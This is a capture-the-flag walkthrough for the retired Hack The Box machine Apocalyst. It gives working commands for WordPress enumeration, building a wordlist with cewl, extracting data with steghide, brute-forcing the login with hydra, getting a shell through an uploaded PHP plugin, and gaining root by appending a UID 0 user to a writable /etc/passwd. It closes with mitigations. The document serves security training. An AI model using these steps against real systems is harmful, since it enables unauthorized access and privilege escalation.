---
machine: Apocalyst
os: Linux
difficulty: Medium
platform: Hack The Box
category: Web / Linux
state: Retired
tags: [linux, wordpress, cewl, steghide, hydra, plugin-upload, passwd-writable]
---

# Apocalyst — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Methodology notes; no flags or real credentials.

## TL;DR

A WordPress box where the hidden directory does not show up with stock wordlists: you **build the wordlist** with `cewl` from the blog itself. The directory found holds an image with a list inside (`steghide`), and that list breaks the WordPress login by brute force. As admin you upload a PHP plugin for a shell. For root, `/etc/passwd` is world-writable, so add a UID 0 user.

## Recon

```bash
nmap -p- -sCV <IP> -oN nmap.txt
```

```text
22/tcp open  ssh  OpenSSH 7.2p2
80/tcp open  http Apache httpd 2.4.18
```

```bash
echo "<IP> apocalyst.htb" >> /etc/hosts
wpscan --url http://apocalyst.htb/ --enumerate u
```

The generator meta pins **WordPress 4.8** and `wpscan` lists user `falaraki`. Directory brute force with standard lists finds nothing useful (`wp-admin`, `wp-content`, `wp-includes`).

## Access

1. **Custom wordlist**:

```bash
cewl http://apocalyst.htb/ -w cewl.txt --with-numbers -d 3
wfuzz -c -w cewl.txt --hc 404 http://apocalyst.htb/FUZZ/
```

A blog-named directory appears; inside are two near-identical images (`image.jpg` and `rightiousness.jpg`) that differ only in size. That is the hint.

2. **Steganography**:

```bash
steghide extract -sf <image>.jpg
# empty passphrase
cat <extracted_file>
```

The extracted file is a password list.

3. **Login brute force**:

```bash
hydra -l falaraki -P <list> apocalyst.htb http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=incorrect"
```

4. **Shell via plugin**: as WordPress admin, package a plugin with a `.php` that runs a reverse shell, upload it from the dashboard and request the plugin path.

```bash
zip -r pwn.zip pwn.php
# Plugins → Add New → Upload
curl "http://apocalyst.htb/wp-content/plugins/pwn/pwn.php?cmd=id"
```

## Escalation

```bash
ls -l /etc/passwd
# -rw-rw-rw- 1 root root ... /etc/passwd
```

World-writable: append a UID 0 user with a known hash.

```bash
openssl passwd -1 -salt x pwned
echo 'pwned:$1$x$<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd
su pwned
```

```text
root@apocalyst:~#
```

## Pitfalls

- **Hostname required**: WordPress uses absolute URLs, so without `apocalyst.htb` in `/etc/hosts` links and the dashboard break.
- `cewl` with `-d 3` collects enough text; depth 1 misses the directory.
- `steghide` with no passphrase: press Enter, do not invent one.
- On modern PAM setups a writable `/etc/passwd` may not suffice (a `shadow` entry is needed); on this box it does.

## Lessons

- Site content is wordlist material: `cewl` finds what dictionaries lack.
- Data hidden in images (`steghide`) is still current in challenges and in real bad practice.
- A world-writable `/etc/passwd` is instant root, no exploit.
- Mitigation: 0644 on `/etc/passwd`, MFA on the panel, and WordPress users who cannot upload plugins.
